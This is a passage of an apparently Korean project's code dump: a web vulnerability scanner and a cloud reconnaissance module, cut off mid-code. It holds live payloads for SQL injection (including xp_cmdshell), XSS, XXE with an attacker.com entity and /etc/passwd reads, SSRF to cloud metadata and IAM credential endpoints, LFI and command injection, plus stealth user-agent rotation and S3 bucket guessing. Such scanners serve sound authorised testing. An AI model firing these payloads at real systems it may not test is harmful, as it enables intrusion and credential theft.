# Project Code Extract (Part 2/5)
- **Root:** `d:\3차 프로젝트\6트\12.26 app`
- **Files included:** 19 (Total: 92)

---

## File 20: web_vulnerabilities.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\exploit\web_vulnerabilities.py`

```python
# app/core/exploit/web_vulnerabilities.py
# 웹 취약점 실제 테스트 모듈

import requests
import time
import re
import random
import logging
from typing import Dict, Any, List, Optional
from urllib.parse import urljoin, urlparse, quote

from ..utils.encoding import PayloadEncoder, WAFBypass
from ..utils.stealth import StealthMode, ConnectionPool, TimeoutManager
from ..utils.rate_limit import RateLimitDetector
from .advanced_verification import AdvancedVerification

logger = logging.getLogger(__name__)


class WebVulnerabilityScanner:
    """
    웹 애플리케이션 취약점 실제 테스트
    """
    
    def __init__(self, timeout: int = 10, stealth_mode: bool = True, use_pool: bool = True):
        self.timeout = timeout
        self.stealth_mode = stealth_mode
        self.use_pool = use_pool
        
        # User-Agent 설정 (스텔스 모드 여부와 관계없이)
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        
        # 스텔스 모드 설정
        if stealth_mode:
            self.stealth = StealthMode(delay_min=0.5, delay_max=2.0)
            self.user_agent = self.stealth.get_random_user_agent()
        else:
            self.stealth = None
        
        # 연결 풀 설정
        if use_pool:
            self.pool = ConnectionPool()
            self.session = self.pool.get_session()
        else:
            self.pool = None
            self.session = requests
        
        # 고급 검증
        self.advanced_verification = AdvancedVerification(min_samples=3, confidence_threshold=0.8)
        
        # 타임아웃 관리
        self.timeout_mgr = TimeoutManager(connect_timeout=5.0, read_timeout=10.0)
        
        # Rate Limiting 감지
        self.rate_limit_detector = RateLimitDetector(max_requests_per_minute=60)
    
    def scan_all(self, url: str) -> Dict[str, Any]:
        """
        모든 웹 취약점 테스트
        
        Returns:
            {
                "sql_injection": {...},
                "xss": {...},
                "xxe": {...},
                "ssrf": {...},
                "lfi": {...},
                "command_injection": {...}
            }
        """
        from .latest_vectors import LatestAttackVectors
        
        latest_vectors = LatestAttackVectors(timeout=self.timeout)
        
        results = {
            "sql_injection": self.test_sql_injection(url),
            "xss": self.test_xss(url),
            "xxe": self.test_xxe(url),
            "ssrf": self.test_ssrf(url),
            "lfi": self.test_lfi(url),
            "command_injection": self.test_command_injection(url),
            "path_traversal": self.test_path_traversal(url),
            # 최신 공격 벡터
            "ssti": latest_vectors.test_ssti(url),
            "graphql": latest_vectors.test_graphql(url),
            "jwt": latest_vectors.test_jwt(url),
            "prototype_pollution": latest_vectors.test_prototype_pollution(url),
            "http_request_smuggling": latest_vectors.test_http_request_smuggling(url),
            # 인증 및 세션 관리
            "broken_authentication": self._test_auth_session(url),
            # 데이터베이스 공격 심화
            "nosql_injection": self._test_nosql_injection(url),
            "orm_injection": self._test_orm_injection(url)
        }
        
        return results
    
    def test_sql_injection(self, url: str) -> Dict[str, Any]:
        """
        SQL Injection 테스트 (Error-based, Time-based, Boolean-based)
        데이터베이스별 정교한 페이로드 사용
        """
        vulnerabilities = []
        
        # Error-based SQL Injection 페이로드 (데이터베이스별)
        error_payloads = {
            "mysql": [
                "'",
                "\"",
                "' OR '1'='1",
                "1' AND 1=1--",
                "1' AND 1=2--",
                "1' UNION SELECT NULL--",
                "' OR 1=1--",
                "admin'--",
                "admin'/*",
                "' OR 'x'='x",
                "' OR 1=1#",
                "') OR ('1'='1--",
                "1' AND extractvalue(1,concat(0x7e,version()))--",
                "1' AND updatexml(1,concat(0x7e,database()),1)--",
                "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
            ],
            "postgresql": [
                "'",
                "1' AND 1=CAST(version() AS INT)--",
                "1' AND 1=CAST(current_database() AS INT)--",
                "1' AND 1=CAST((SELECT version()) AS INT)--",
                "1' UNION SELECT NULL,NULL--",
                "1' OR '1'='1'--"
            ],
            "mssql": [
                "'",
                "1' AND 1=CONVERT(INT,@@VERSION)--",
                "1' AND 1=CONVERT(INT,DB_NAME())--",
                "1'; EXEC xp_cmdshell('dir')--",
                "1' UNION SELECT NULL,NULL--"
            ],
            "oracle": [
                "'",
                "1' AND 1=UTL_INADDR.get_host_name((SELECT banner FROM v$version WHERE rownum=1))--",
                "1' UNION SELECT NULL FROM DUAL--",
                "1' OR '1'='1'--"
            ],
            "generic": [
                "'",
                "\"",
                "' OR '1'='1",
                "1' AND 1=1--",
                "1' AND 1=2--",
                "1' UNION SELECT NULL--"
            ]
        }
        
        # Time-based SQL Injection 페이로드 (데이터베이스별)
        time_payloads = {
            "mysql": [
                "1' AND SLEEP(5)--",
                "1' AND BENCHMARK(5000000,MD5('A'))--",
                "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "1'; SELECT SLEEP(5)--"
            ],
            "postgresql": [
                "1' AND pg_sleep(5)--",
                "1'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
                "1'; SELECT pg_sleep(5)--"
            ],
            "mssql": [
                "1'; WAITFOR DELAY '00:00:05'--",
                "1'; IF (1=1) WAITFOR DELAY '00:00:05'--",
                "1'; EXEC xp_cmdshell('ping 127.0.0.1')--"
            ],
            "oracle": [
                "1' AND (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)--",
                "1' AND DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)--"
            ],
            "generic": [
                "1' AND SLEEP(5)--",
                "1'; WAITFOR DELAY '00:00:05'--",
                "1' AND pg_sleep(5)--"
            ]
        }
        
        try:
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            
            # GET 파라미터 테스트
            params = self._extract_params(url)
            
            for param_name in params[:5]:  # 최대 5개 파라미터만 테스트
                # Error-based 테스트
                for payload in error_payloads[:5]:
                    try:
                        test_url = f"{base_url}?{param_name}={quote(payload)}"
                        response = requests.get(
                            test_url,
                            timeout=self.timeout,
                            verify=False,
                            headers={"User-Agent": self.user_agent}
                        )
                        
                        # Rate Limiting 확인
                        if self.rate_limit_detector.check_rate_limit(response):
                            if self.rate_limit_detector.should_wait():
                                wait_time = self.rate_limit_detector.get_wait_time()
                                logger.warning(f"Rate limited. Waiting {wait_time:.1f}s...")
                                time.sleep(wait_time)
                            continue
                        
                        self.rate_limit_detector.record_request()
                        
                        # SQL 에러 패턴 확인 (데이터베이스별)
                        error_patterns = {
                            "mysql": [
                                r"mysql.*error",
                                r"warning.*mysql",
                                r"you have an error in your sql syntax",
                                r"mysql_fetch",
                                r"mysql_num_rows",
                                r"mysql_query"
                            ],
                            "postgresql": [
                                r"postgresql.*error",
                                r"pg_query\(\)",
                                r"pg_exec\(\)",
                                r"postgres.*syntax error"
                            ],
                            "mssql": [
                                r"microsoft.*odbc",
                                r"sql server.*error",
                                r"odbc sql server driver",
                                r"sqlserver jdbc"
                            ],
                            "oracle": [
                                r"ora-\d+",
                                r"oracle.*error",
                                r"oracle.*exception",
                                r"oracle jdbc"
                            ],
                            "generic": [
                                r"sql.*syntax",
                                r"sql.*error",
                                r"unclosed quotation mark",
                                r"driver.*sql",
                                r"sql.*exception"
                            ]
                        }
                        
                        response_lower = response.text.lower()
                        detected_db = None
                        evidence = None
                        
                        for db_type, patterns in error_patterns.items():
                            for pattern in patterns:
                                match = re.search(pattern, response_lower, re.IGNORECASE)
                                if match:
                                    detected_db = db_type
                                    evidence = match.group(0)
                                    break
                            if detected_db:
                                break
                        
                        if detected_db:
                            vulnerabilities.append({
                                "type": f"Error-based SQL Injection ({detected_db})",
                                "parameter": param_name,
                                "payload": payload,
                                "severity": "HIGH",
                                "method": "GET",
                                "detection_method": "error_based",
                                "evidence": evidence,
                                "confidence": 85 if detected_db != "generic" else 70
                            })
                            break
                    except:
                        continue
                
                # Time-based 테스트 (데이터베이스별)
                for db_type, payloads in time_payloads.items():
                    for payload in payloads[:3]:
                        try:
                            start = time.time()
                            test_url = f"{base_url}?{param_name}={quote(payload)}"
                            response = requests.get(
                                test_url,
                                timeout=10,
                                verify=False,
                                headers={"User-Agent": self.user_agent}
                            )
                            elapsed = time.time() - start
                            
                            # 정확한 시간 지연 확인 (5초 ± 0.5초)
                            if elapsed >= 4.5:
                                vulnerabilities.append({
                                    "type": f"Time-based SQL Injection ({db_type})",
                                    "parameter": param_name,
                                    "payload": payload,
                                    "measured_delay": elapsed,
                                    "expected_delay": 5.0,
                                    "severity": "HIGH",
                                    "method": "GET",
                                    "detection_method": "time_based",
                                    "confidence": 90 if abs(elapsed - 5.0) < 0.5 else 75
                                })
                                break
                        except:
                            continue
                
                # Boolean-based Blind SQL Injection 테스트 - 다단계 검증
                try:
                    true_payload = f"1' AND '1'='1"
                    false_payload = f"1' AND '1'='2"
                    
                    verification_result = self.advanced_verification.verify_boolean_based_sqli(
                        base_url,
                        f"{param_name}={quote(true_payload)}",
                        f"{param_name}={quote(false_payload)}",
                        samples=3
                    )
                    
                    if verification_result.get("verified"):
                        vulnerabilities.append({
                            "type": "Boolean-based Blind SQL Injection",
                            "parameter": param_name,
                            "severity": "HIGH",
                            "method": "GET",
                            "detection_method": "boolean_based",
                            "confidence": int(verification_result.get("confidence", 0.8) * 100),
                            "verification": verification_result
                        })
                except Exception as e:
                    logger.debug(f"Boolean-based SQLi 테스트 실패: {e}")
                
                if vulnerabilities:
                    break
            
        except Exception as e:
            logger.warning(f"SQL Injection 테스트 실패: {e}")
        
        # 신뢰도 스코어링 적용
        try:
            from ...core.utils.confidence import enhance_finding_with_confidence
            
            for i, vuln in enumerate(vulnerabilities):
                vulnerabilities[i] = enhance_finding_with_confidence(vuln)
        except ImportError:
            # confidence 모듈이 없으면 기본 신뢰도만 추가
            for vuln in vulnerabilities:
                if "confidence" not in vuln:
                    vuln["confidence"] = vuln.get("confidence", 70)
        
        return {
            "vulnerable": len(vulnerabilities) > 0,
            "vulnerabilities": vulnerabilities,
            "tested": True
        }
    
    def test_xss(self, url: str) -> Dict[str, Any]:
        """
        XSS (Cross-Site Scripting) 테스트
        """
        vulnerabilities = []
        
        # XSS 페이로드
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
            "<iframe src=javascript:alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>"
        ]
        
        try:
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            
            params = self._extract_params(url)
            
            for param_name in params[:5]:
                for payload in xss_payloads[:5]:
                    try:
                        test_url = f"{base_url}?{param_name}={quote(payload)}"
                        response = requests.get(
                            test_url,
                            timeout=self.timeout,
                            verify=False,
                            headers={"User-Agent": self.user_agent}
                        )
                        
                        # 페이로드가 응답에 그대로 포함되어 있으면 취약
                        if payload in response.text or payload.replace("'", "&#39;") in response.text:
                            vulnerabilities.append({
                                "type": "Reflected XSS",
                                "parameter": param_name,
                                "payload": payload,
                                "severity": "MEDIUM",
                                "method": "GET"
                            })
                            break
                    except:
                        continue
                
                if vulnerabilities:
                    break
            
        except Exception as e:
            logger.warning(f"XSS 테스트 실패: {e}")
        
        # 신뢰도 스코어링 적용
        try:
            from ...core.utils.confidence import enhance_finding_with_confidence
            
            for i, vuln in enumerate(vulnerabilities):
                vulnerabilities[i] = enhance_finding_with_confidence(vuln)
        except ImportError:
            # confidence 모듈이 없으면 기본 신뢰도만 추가
            for vuln in vulnerabilities:
                if "confidence" not in vuln:
                    vuln["confidence"] = vuln.get("confidence", 70)
        
        return {
            "vulnerable": len(vulnerabilities) > 0,
            "vulnerabilities": vulnerabilities,
            "tested": True
        }
    
    def test_xxe(self, url: str) -> Dict[str, Any]:
        """
        XXE (XML External Entity) 테스트
        """
        vulnerabilities = []
        
        # XXE 페이로드
        xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>'
        ]
        
        try:
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            
            for payload in xxe_payloads[:2]:
                try:
                    headers = {
                        "Content-Type": "application/xml",
                        "User-Agent": self.user_agent
                    }
                    
                    response = requests.post(
                        base_url,
                        data=payload,
                        headers=headers,
                        timeout=self.timeout,
                        verify=False
                    )
                    
                    # 파일 내용이나 외부 엔티티 참조가 응답에 포함되면 취약
                    if "root:" in response.text or "attacker.com" in response.text or "[fonts]" in response.text:
                        vulnerabilities.append({
                            "type": "XXE",
                            "payload": payload[:100],
                            "severity": "HIGH",
                            "method": "POST"
                        })
                        break
                except:
                    continue
            
        except Exception as e:
            logger.warning(f"XXE 테스트 실패: {e}")
        
        # 신뢰도 스코어링 적용
        try:
            from ...core.utils.confidence import enhance_finding_with_confidence
            
            for i, vuln in enumerate(vulnerabilities):
                vulnerabilities[i] = enhance_finding_with_confidence(vuln)
        except ImportError:
            # confidence 모듈이 없으면 기본 신뢰도만 추가
            for vuln in vulnerabilities:
                if "confidence" not in vuln:
                    vuln["confidence"] = vuln.get("confidence", 70)
        
        return {
            "vulnerable": len(vulnerabilities) > 0,
            "vulnerabilities": vulnerabilities,
            "tested": True
        }
    
    def test_ssrf(self, url: str) -> Dict[str, Any]:
        """
        SSRF (Server-Side Request Forgery) 테스트
        """
        vulnerabilities = []
        
        # SSRF 테스트 URL (메타데이터 서비스 등)
        ssrf_targets = [
            "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1:22",
            "http://localhost/admin",
            "file:///etc/passwd"
        ]
        
        try:
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            
            params = self._extract_params(url)
            
            for param_name in params[:3]:
                for target in ssrf_targets[:2]:
                    try:
                        test_url = f"{base_url}?{param_name}={quote(target)}"
                        response = requests.get(
                            test_url,
                            timeout=5,
                            verify=False,
                            headers={"User-Agent": self.user_agent},
                            allow_redirects=False
                        )
                        
                        # 메타데이터나 로컬 파일 내용이 응답에 포함되면 취약
                        if "169.254.169.254" in target and ("instance-id" in response.text or "ami-id" in response.text):
                            vulnerabilities.append({
                                "type": "SSRF",
                                "parameter": param_name,
                                "target": target,
                                "severity": "HIGH",
                                "method": "GET"
                            })
                            break
                    except:
                        continue
                
                if vulnerabilities:
                    break
            
        except Exception as e:
            logger.warning(f"SSRF 테스트 실패: {e}")
        
        # 신뢰도 스코어링 적용
        try:
            from ...core.utils.confidence import enhance_finding_with_confidence
            
            for i, vuln in enumerate(vulnerabilities):
                vulnerabilities[i] = enhance_finding_with_confidence(vuln)
        except ImportError:
            # confidence 모듈이 없으면 기본 신뢰도만 추가
            for vuln in vulnerabilities:
                if "confidence" not in vuln:
                    vuln["confidence"] = vuln.get("confidence", 70)
        
        return {
            "vulnerable": len(vulnerabilities) > 0,
            "vulnerabilities": vulnerabilities,
            "tested": True
        }
    
    def test_lfi(self, url: str) -> Dict[str, Any]:
        """
        LFI (Local File Inclusion) 테스트
        """
        vulnerabilities = []
        
        # LFI 페이로드
        lfi_payloads = [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..\\..\\..\\windows\\win.ini",
            "/etc/passwd",
            "C:\\windows\\win.ini"
        ]
        
        try:
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            
            params = self._extract_params(url)
            
            for param_name in params[:3]:
                for payload in lfi_payloads[:4]:
                    try:
                        test_url = f"{base_url}?{param_name}={quote(payload)}"
                        response = requests.get(
                            test_url,
                            timeout=self.timeout,
                            verify=False,
                            headers={"User-Agent": self.user_agent}
                        )
                        
                        # 파일 내용 패턴 확인
                        if "root:" in response.text or "[fonts]" in response.text or "for 16-bit app support" in response.text:
                            vulnerabilities.append({
                                "type": "LFI",
                                "parameter": param_name,
                                "payload": payload,
                                "severity": "HIGH",
                                "method": "GET"
                            })
                            break
                    except:
                        continue
                
                if vulnerabilities:
                    break
            
        except Exception as e:
            logger.warning(f"LFI 테스트 실패: {e}")
        
        # 신뢰도 스코어링 적용
        try:
            from ...core.utils.confidence import enhance_finding_with_confidence
            
            for i, vuln in enumerate(vulnerabilities):
                vulnerabilities[i] = enhance_finding_with_confidence(vuln)
        except ImportError:
            # confidence 모듈이 없으면 기본 신뢰도만 추가
            for vuln in vulnerabilities:
                if "confidence" not in vuln:
                    vuln["confidence"] = vuln.get("confidence", 70)
        
        return {
            "vulnerable": len(vulnerabilities) > 0,
            "vulnerabilities": vulnerabilities,
            "tested": True
        }
    
    def test_command_injection(self, url: str) -> Dict[str, Any]:
        """
        Command Injection 테스트
        """
        vulnerabilities = []
        
        # Command Injection 페이로드
        cmd_payloads = [
            "; ls",
            "| whoami",
            "& dir",
            "`id`",
            "$(whoami)",
            "; cat /etc/passwd",
            "| type C:\\windows\\win.ini"
        ]
        
        try:
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            
            params = self._extract_params(url)
            
            for param_name in params[:3]:
                for payload in cmd_payloads[:4]:
                    try:
                        test_url = f"{base_url}?{param_name}={quote(payload)}"
                        response = requests.get(
                            test_url,
                            timeout=self.timeout,
                            verify=False,
                            headers={"User-Agent": self.user_agent}
                        )
                        
                        # 명령어 실행 결과 패턴 확인
                        if "uid=" in response.text or "gid=" in response.text or "[fonts]" in response.text:
                            vulnerabilities.append({
                                "type": "Command Injection",
                                "parameter": param_name,
                                "payload": payload,
                                "severity": "CRITICAL",
                                "method": "GET"
                            })
                            break
                    except:
                        continue
                
                if vulnerabilities:
                    break
            
        except Exception as e:
            logger.warning(f"Command Injection 테스트 실패: {e}")
        
        # 신뢰도 스코어링 적용
        try:
            from ...core.utils.confidence import enhance_finding_with_confidence
            
            for i, vuln in enumerate(vulnerabilities):
                vulnerabilities[i] = enhance_finding_with_confidence(vuln)
        except ImportError:
            # confidence 모듈이 없으면 기본 신뢰도만 추가
            for vuln in vulnerabilities:
                if "confidence" not in vuln:
                    vuln["confidence"] = vuln.get("confidence", 70)
        
        return {
            "vulnerable": len(vulnerabilities) > 0,
            "vulnerabilities": vulnerabilities,
            "tested": True
        }
    
    def test_path_traversal(self, url: str) -> Dict[str, Any]:
        """
        Path Traversal 테스트
        """
        vulnerabilities = []
        
        # Path Traversal 페이로드
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "....//....//etc/passwd",
            "/etc/passwd%00",
            "..%2F..%2F..%2Fetc%2Fpasswd"
        ]
        
        try:
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            
            # URL 경로에 직접 삽입
            for payload in traversal_payloads[:3]:
                try:
                    test_url = urljoin(base_url, payload)
                    response = requests.get(
                        test_url,
                        timeout=self.timeout,
                        verify=False,
                        headers={"User-Agent": self.user_agent}
                    )
                    
                    if "root:" in response.text or "[fonts]" in response.text:
                        vulnerabilities.append({
                            "type": "Path Traversal",
                            "payload": payload,
                            "severity": "HIGH",
                            "method": "GET"
                        })
                        break
                except:
                    continue
            
        except Exception as e:
            logger.warning(f"Path Traversal 테스트 실패: {e}")
        
        # 신뢰도 스코어링 적용
        try:
            from ...core.utils.confidence import enhance_finding_with_confidence
            
            for i, vuln in enumerate(vulnerabilities):
                vulnerabilities[i] = enhance_finding_with_confidence(vuln)
        except ImportError:
            # confidence 모듈이 없으면 기본 신뢰도만 추가
            for vuln in vulnerabilities:
                if "confidence" not in vuln:
                    vuln["confidence"] = vuln.get("confidence", 70)
        
        return {
            "vulnerable": len(vulnerabilities) > 0,
            "vulnerabilities": vulnerabilities,
            "tested": True
        }
    
    def _test_auth_session(self, url: str) -> Dict[str, Any]:
        """인증 및 세션 관리 테스트"""
        try:
            from .auth_session import AuthSessionTester
            tester = AuthSessionTester(timeout=self.timeout)
            return {
                "broken_authentication": tester.test_broken_authentication(url),
                "oauth_oidc": tester.test_oauth_oidc(url),
                "api_keys": tester.test_api_keys(url)
            }
        except Exception as e:
            logger.warning(f"인증/세션 테스트 실패: {e}")
            return {"tested": False, "error": str(e)}
    
    def _test_nosql_injection(self, url: str) -> Dict[str, Any]:
        """NoSQL Injection 테스트"""
        try:
            from .db_advanced import AdvancedDatabaseAttacks
            tester = AdvancedDatabaseAttacks(timeout=self.timeout)
            return tester.test_nosql_injection(url)
        except Exception as e:
            logger.warning(f"NoSQL Injection 테스트 실패: {e}")
            return {"tested": False, "error": str(e)}
    
    def _test_orm_injection(self, url: str) -> Dict[str, Any]:
        """ORM Injection 테스트"""
        try:
            from .db_advanced import AdvancedDatabaseAttacks
            tester = AdvancedDatabaseAttacks(timeout=self.timeout)
            return tester.test_orm_injection(url)
        except Exception as e:
            logger.warning(f"ORM Injection 테스트 실패: {e}")
            return {"tested": False, "error": str(e)}
    
    def _extract_params(self, url: str) -> List[str]:
        """
        URL에서 파라미터 이름 추출
        """
        try:
            parsed = urlparse(url)
            params = []
            
            # 쿼리 스트링에서 파라미터 추출
            if parsed.query:
                for param in parsed.query.split("&"):
                    if "=" in param:
                        params.append(param.split("=")[0])
            
            # 파라미터가 없으면 기본값 사용
            if not params:
                params = ["id", "page", "file", "path", "name", "search", "q", "query"]
            
            return params
        except:
            return ["id", "page", "file"]

```
---

## File 21: __init__.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\recon\__init__.py`

```python
# Reconnaissance modules

```
---

## File 22: cloud.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\recon\cloud.py`

```python
# app/core/recon/cloud.py
# 클라우드 인프라 정보 수집 모듈

import requests
import re
import json
import logging
from typing import Dict, Any, List, Optional
from urllib.parse import urlparse

logger = logging.getLogger(__name__)


def check_s3_bucket(bucket_name: str) -> Dict[str, Any]:
    """
    S3 버킷 접근 가능 여부 확인
    
    Returns:
        {
            "exists": True,
            "public": True,
            "region": "us-east-1"
        }
    """
    s3_info = {
        "exists": False,
        "public": False,
        "region": None
    }
    
    # S3 버킷 URL 패턴
    s3_urls = [
        f"https://{bucket_name}.s3.amazonaws.com",
        f"https://s3.amazonaws.com/{bucket_name}",
    ]
    
    for url in s3_urls:
        try:
            response = requests.get(url, timeout=5, allow_redirects=False)
            if response.status_code in [200, 403]:
                s3_info["exists"] = True
                s3_info["public"] = (response.status_code == 200)
                break
        except:
            continue
    
    return s3_info


def analyze_s3_bucket_policy(bucket_name: str) -> Dict[str, Any]:
    """
    S3 버킷 정책 및 ACL 분석
    
    Returns:
        {
            "bucket_policy": {...},
            "acl": {...},
            "public_access_block": {...},
            "security_issues": [...]
        }
    """
    policy_info = {
        "bucket_policy": None,
        "acl": None,
        "public_access_block": None,
        "security_issues": []
    }
    
    # boto3를 사용한 상세 분석 (자격 증명이 있는 경우)
    try:
        import boto3
        from botocore.exceptions import ClientError, NoCredentialsError
        
        try:
            s3_client = boto3.client('s3')
            
            # 버킷 정책 확인
            try:
                policy = s3_client.get_bucket_policy(Bucket=bucket_name)
                policy_info["bucket_policy"] = policy.get("Policy")
                
                # 정책에서 공개 접근 허용 여부 확인
                if policy_info["bucket_policy"]:
                    policy_json = json.loads(policy_info["bucket_policy"])
                    statements = policy_json.get("Statement", [])
                    for stmt in statements:
                        if stmt.get("Effect") == "Allow" and stmt.get("Principal") == "*":
                            policy_info["security_issues"].append({
                                "type": "public_policy",
                                "severity": "HIGH",
                                "description": "버킷 정책에서 모든 사용자에게 접근 허용"
                            })
            except ClientError as e:
                if e.response['Error']['Code'] != 'NoSuchBucketPolicy':
                    policy_info["security_issues"].append({
                        "type": "policy_error",
                        "severity": "INFO",
                        "description": f"정책 조회 실패: {e}"
                    })
            
            # ACL 확인
            try:
                acl = s3_client.get_bucket_acl(Bucket=bucket_name)
                grants = acl.get("Grants", [])
                
                policy_info["acl"] = {
                    "grants": grants,
                    "public_read": False,
                    "public_write": False
                }
                
                for grant in grants:
                    grantee = grant.get("Grantee", {})
                    if grantee.get("Type") == "Group" and "AllUsers" in grantee.get("URI", ""):
                        permission = grant.get("Permission")
                        if permission in ["READ", "READ_ACP"]:
                            policy_info["acl"]["public_read"] = True
                            policy_info["security_issues"].append({
                                "type": "public_acl_read",
                                "severity": "HIGH",
                                "description": "ACL에서 모든 사용자에게 읽기 권한 부여"
                            })
                        if permission in ["WRITE", "WRITE_ACP", "FULL_CONTROL"]:
                            policy_info["acl"]["public_write"] = True
                            policy_info["security_issues"].append({
                                "type": "public_acl_write",
                                "severity": "CRITICAL",
                                "description": "ACL에서 모든 사용자에게 쓰기 권한 부여"
                            })
            except ClientError as e:
                policy_info["security_issues"].append({
                    "type": "acl_error",
                    "severity": "INFO",
                    "description": f"ACL 조회 실패: {e}"
                })
            
            # 퍼블릭 접근 차단 설정 확인
            try:
                public_access = s3_client.get_public_access_block(Bucket=bucket_name)
                policy_info["public_access_block"] = public_access.get("PublicAccessBlockConfiguration", {})
            except ClientError as e:
                if e.response['Error']['Code'] != 'NoSuchPublicAccessBlockConfiguration':
                    policy_info["security_issues"].append({
                        "type": "public_access_block_error",
                        "severity": "INFO",
                        "description": f"퍼블릭 접근 차단 설정 조회 실패: {e}"
                    })
            
        except NoCredentialsError:
            policy_info["security_issues"].append({
                "type": "no_credentials",
                "severity": "INFO",
                "description": "AWS 자격 증명이 없어 상세 분석 불가 (HTTP 요청으로만 확인)"
            })
            
    except ImportError:
        # boto3가 없으면 HTTP 요청으로만 확인
        policy_info["security_issues"].append({
            "type": "boto3_missing",
            "severity": "INFO",
            "description": "boto3가 설치되지 않아 상세 분석 불가 (HTTP 요청으로만 확인)"
        })
        
        # HTTP 요청으로 버킷 접근 가능 여부만 확인
        s3_info = check_s3_bucket(bucket_name)
        if s3_info["public"]:
            policy_info["security_issues"].append({
                "type": "public_access",
                "severity": "HIGH",
                "description": "HTTP 요청으로 버킷에 공개 접근 가능"
            })
    
    return policy_info


def check_azure_blob(account_name: str, container_name: str = None) -> Dict[str, Any]:
    """
    Azure Blob Storage 접근 가능 여부 확인
    
    Returns:
        {
            "exists": True,
            "public": True
        }
    """
    azure_info = {
        "exists": False,
        "public": False
    }
    
    if container_name:
        url = f"https://{account_name}.blob.core.windows.net/{container_name}"
    else:
        url = f"https://{account_name}.blob.core.windows.net"
    
    try:
        response = requests.get(url, timeout=5, allow_redirects=False)
        if response.status_code in [200, 403]:
            azure_info["exists"] = True
            azure_info["public"] = (response.status_code == 200)
    except:
        pass
    
    return azure_info


def check_gcp_storage(bucket_name: str) -> Dict[str, Any]:
    """
    Google Cloud Storage 접근 가능 여부 확인
    
    Returns:
        {
            "exists": True,
            "public": True
        }
    """
    gcp_info = {
        "exists": False,
        "public": False
    }
    
    url = f"https://storage.googleapis.com/{bucket_name}"
    
    try:
        response = requests.get(url, timeout=5, allow_redirects=False)
        if response.status_code in [200, 403]:
            gcp_info["exists"] = True
            gcp_info["public"] = (response.status_code == 200)
    except:
        pass
    
    return gcp_info


def discover_cloud_assets(target: str) -> Dict[str, Any]:
    """
    클라우드 자산 발견 (S3, Azure, GCP)
    
    Args:
        target: 타겟 도메인 (예: "example.com")
    
    Returns:
        {
            "s3_buckets": [...],
            "azure_blobs": [...],
            "gcp_buckets": [...],
            "cloud_technologies": [...]
        }
    """
    logger.info("클라우드 자산 발견 시작")
    
    cloud_technologies = []
    
    # 도메인에서 추출 가능한 버킷 이름 패턴
    domain_parts = target.replace("www.", "").split(".")
    base_name = domain_parts[0] if domain_parts else target
    
    # 일반적인 버킷 이름 패턴
    bucket_candidates = [
        base_name,
        f"{base_name}-backup",
        f"{base_name}-dev",
        f"{base_name}-staging",
        f"{base_name}-prod",
        f"{base_name}-test",
        f"{base_name}-assets",
        f"{base_name}-static",
    ]
    
    s3_buckets = []
    for bucket_name in bucket_candidates[:5]:  # 처음 5개만 체크
        s3_info = check_s3_bucket(bucket_name)
        if s3_info["exists"]:
            # 버킷 정책 및 ACL 분석
            policy_info = analyze_s3_bucket_policy(bucket_name)
            
            s3_buckets.append({
                "name": bucket_name,
                "public": s3_info["public"],
                "policy_info": policy_info
            })
            
            tech_info = {
                "type": "cloud_storage",
                "name": f"AWS S3: {bucket_name}",
                "source": "Cloud Asset Discovery",
                "public": s3_info["public"]
            }
            
            # 보안 이슈가 있으면 추가
            if policy_info.get("security_issues"):
                tech_info["security_issues"] = policy_info["security_issues"]
                tech_info["risk"] = "HIGH" if any(issue.get("severity") in ["HIGH", "CRITICAL"] for issue in policy_info["security_issues"]) else "MEDIUM"
            
            cloud_technologies.append(tech_info)
    
    return {
        "s3_buckets": s3_buckets,
        "cloud_technologies": cloud_technologies
    }


def check_cloud_metadata(target: str) -> Dict[str, Any]:
    """
    클라우드 메타데이터 서비스 확인 (SSRF 시뮬레이션)
    AWS, Azure, GCP 메타데이터 엔드포인트 체크
    
    Returns:
        {
            "aws_metadata": {...},
            "azure_metadata": {...},
            "gcp_metadata": {...}
        }
    """
    metadata_info = {
        "aws_metadata": {"accessible": False, "endpoint": None},
        "azure_metadata": {"accessible": False, "endpoint": None},
        "gcp_metadata": {"accessible": False, "endpoint": None}
    }
    
    metadata_endpoints = {
        "aws": [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        ],
        "azure": [
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01"
        ],
